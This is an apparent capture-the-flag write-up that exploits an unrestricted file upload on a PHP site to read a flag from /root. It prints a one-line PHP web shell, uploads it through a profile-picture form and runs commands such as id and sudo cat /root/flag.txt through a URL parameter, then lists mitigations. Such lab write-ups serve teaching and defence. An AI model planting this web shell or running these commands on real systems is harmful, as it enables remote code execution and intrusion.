![](https://miro.medium.com/v2/resize:fit:696/1*psKD7dQgeOjtQatax5eOng.png)

## Challenge Description

> _“A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the_ `_/root_` _directory."_

## Initial Analysis

Upon navigating to the target website, I located a profile picture upload form. Given the hint that the file upload functionality was improperly sanitized, the primary attack vector pointed towards an **Unrestricted File Upload** vulnerability.

To confirm the backend environment, I inspected the stack using the **Wappalyzer** extension, which confirmed that the target was running on **PHP**.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*ZjAuXy7BdnMIbfhRwNuw1Q.png)

Since the server processes PHP scripts and lacks input validation on uploaded files, arbitrary code execution can be achieved by uploading a web shell.

## Exploitation Flow

## 1\. Creating and Uploading the Web Shell

To gain command execution capabilities on the server, I created a simple, one-line PHP web shell named `shell.php`:

PHP

```
<?php system($_REQUEST['cmd']); ?>
```

I then uploaded `shell.php` through the profile picture upload form. The application accepted the file without validation and stored it at `/uploads/shell.php`.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*mrNZUQVAqHhRC1ehnOkW9A.png)

## 2\. Verifying Remote Code Execution (RCE)

To verify that the web shell was functioning as intended, I accessed the file via the browser and passed the `id` command through the `cmd` GET parameter:

Plaintext

```
/uploads/shell.php?cmd=id
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*PU4N7RIn6bvHuf6R7z2prQ.png)

The browser rendered the output of the user identity command, confirming active Remote Code Execution on the system.

## 3\. Directory Enumeration

The challenge description noted that the flag was located somewhere inside the `/root` directory. To inspect the file system structure, I executed the `ls /` command to list the contents of the root system directory:

Plaintext

```
/uploads/shell.php?cmd=ls /
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*-LYTMYpwlZNyPhZLZ5FLjQ.png)

The directory listing confirmed the presence of the `/root` folder.

## 4\. Retrieving the Flag

Finally, to read the flag file within `/root`, administrative privileges were required. I passed `sudo cat /root/flag.txt` through the parameter:

Plaintext

```
/uploads/shell.php?cmd=sudo cat /root/flag.txt
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*WQHpNGww03JoVaHGgvLalA.png)

The file contents were rendered successfully, disclosing the flag.

## Conclusion & Mitigation

Unrestricted file upload vulnerabilities occur when an application allows users to upload executable files without verifying their extension, MIME type, or content structure.

To remediate this issue in PHP applications:

- **Validate File Extensions:** Enforce a strict whitelist of allowed image extensions (e.g., `.jpg`, `.png`, `.webp`).
- **Rename Uploaded Files:** Generate randomized file names on upload and strip original extensions.
- **Store Uploads Outside the Web Root:** Prevent direct execution by serving user files through a script or dedicated content delivery domain with execution permissions disabled.
